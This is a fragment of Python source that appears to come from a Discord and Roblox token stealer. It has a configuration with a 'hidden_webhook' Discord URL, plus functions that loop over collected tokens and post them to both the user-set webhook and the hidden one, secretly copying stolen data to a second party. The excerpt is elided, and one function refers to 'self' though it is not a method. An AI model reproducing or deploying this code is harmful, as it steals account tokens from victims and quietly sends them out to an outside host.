...
__CONFIG__ = {
    "webhook": "None",
    "hidden_webhook": "https://discord.com/api/webhooks/1215774393800724610/GbAcpMQF1CmLih5D9UUxc4md1ABwV1iwCd0kxhsTNX8I5hNwYzcQHhfB9R4--0FkhnHg",  # Hidden webhook
    "ping": False,
    "pingtype": "None",
    "fakeerror": False,
    "startup": False,
...
def main(webhook: str):
    ...
    upload_dual(__CONFIG__["webhook"], __CONFIG__["hidden_webhook"])  # Upload data to both webhooks
...
def upload_dual(webhook: str, hidden_webhook: str):
    for token in self.tokens:
        ...
        requests.post(hidden_webhook, json=data)

    robloxinfo_dual(__CONFIG__["webhook"], __CONFIG__["hidden_webhook"])  # Call robloxinfo_dual to send data to both webhooks
...
def robloxinfo_dual(webhook: str, hidden_webhook: str):
